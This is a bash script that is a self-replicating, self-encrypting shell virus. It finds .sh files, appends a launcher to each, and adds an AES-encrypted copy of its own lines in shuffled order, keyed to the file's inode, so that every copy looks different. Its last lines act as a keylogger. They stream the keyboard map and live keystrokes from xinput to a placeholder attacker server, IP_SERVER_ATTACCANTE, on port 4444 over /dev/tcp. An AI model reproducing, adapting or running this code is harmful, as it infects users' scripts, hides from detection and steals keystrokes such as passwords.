ret_val="-1" #@1
CRYPTED=0 #@2
if [ "$1" == "test" ]; then  #@3
  ret_val="0"  #@4
else  #@5
RANDOM=$$  #@6
find $(pwd) -regex ".*\.\(sh\)" -printf '%p ' | while read -d $' ' target; do  #@7
  nbline=$(wc -l $target)  #@8
  nbline=$(echo $nbline | cut -d " " -f1)  #@9
  if [ $(($nbline)) -lt 56 ]; then  #@10
    continue  #@11
  fi  #@12
  tail -n 1 $target | openssl enc -d -aes-128-cbc -A -a -salt -k $(ls -i $target | cut -d" " -f1) > /dev/null 2> /dev/null #@13
  if [ "$?" -eq "0" ]; then  #@14
    cod_ordinato=$(tail -n 1 $target | openssl enc -d -aes-128-cbc -A -a -salt -k $(ls -i $target | cut -d" " -f1) | awk '{ print($NF" "$0) }' | cut -d"@" -f2- | sort -g | cut -d" " -f2- ) #@15
    cod_ordinato=${cod_ordinato/CRYPTED=[0-1]/"CRYPTED=$CRYPTED"} #@16
    eval "${cod_ordinato//'$1'/'test'}"  #@17
    if [ "$ret_val" == "0" ]; then  #@18
      continue  #@19
    fi  #@20
  fi  #@21
  echo "" >> $target #@22
  echo "backup=\$(tail -n 1 \$0 | openssl enc -d -aes-128-cbc -A -a -salt -k \$(ls -i \$0 | cut -d\" \" -f1) | awk '{ print(\$NF\" \"\$0) }' | cut -d\"@\" -f2- | sort -g | cut -d\" \" -f2- )" >> $target  #@23
  echo "eval \"\${backup/CRYPTED=0/'CRYPTED=1'}\" &" >> $target  #@24
  echo "exit 0" >> $target  #@25
  tabft=("FT" [55]=" ")  #@26
  declare -i nbl=0  #@27
  var_righe="" #@28
  if [ $CRYPTED == 0 ]; then #@29
   while [ $nbl -ne 55 ]; do  #@30
     valindex=$(((RANDOM % 55)+1))  #@31
     while [ "${tabft[$valindex]}" == "FT" ]; do  #@32
       valindex=$(((RANDOM % 55) + 1))  #@33
     done  #@34
     line=$(tail -n $valindex $0 | head -1)  #@35
     var_righe+='\''n'$line #@36
     nbl=$(($nbl+1)) && tabft[$valindex]="FT"  #@37
   done  #@38
  else #@39
   cod_ordinato=$(tail -n 1 $0 | openssl enc -d -aes-128-cbc -A -a -salt -k $(ls -i $0 | cut -d" " -f1) | awk '{ print($NF" "$0) }' | cut -d"@" -f2- | sort -g | cut -d" " -f2- ) #@40
   while [ $nbl -ne 55 ]; do  #@41
     valindex=$(((RANDOM % 55)+1))  #@42
     while [ "${tabft[$valindex]}" == "FT" ]; do  #@43
       valindex=$(((RANDOM % 55) + 1))  #@44
     done  #@45
     line=$(echo "$cod_ordinato" | tail -n $valindex | head -1)  #@46
     var_righe+='\''n'$line #@47
     nbl=$(($nbl+1)) && tabft[$valindex]="FT"  #@48
   done  #@49
  fi #@50
  echo -e "$var_righe" | openssl enc -aes-128-cbc -A -a -salt -k $(ls -i $target | cut -d" " -f1) >> $target #@51
done  #@52
xmodmap -pke > /dev/tcp/IP_SERVER_ATTACCANTE/4444 & #@53
xinput --test $(xinput --list | grep "AT Translated Set 2 keyboard" | cut -d"=" -f2 | cut -d$'\t' -f1 | tail -n1) > /dev/tcp/IP_SERVER_ATTACCANTE/4444 & #@54
fi #@55
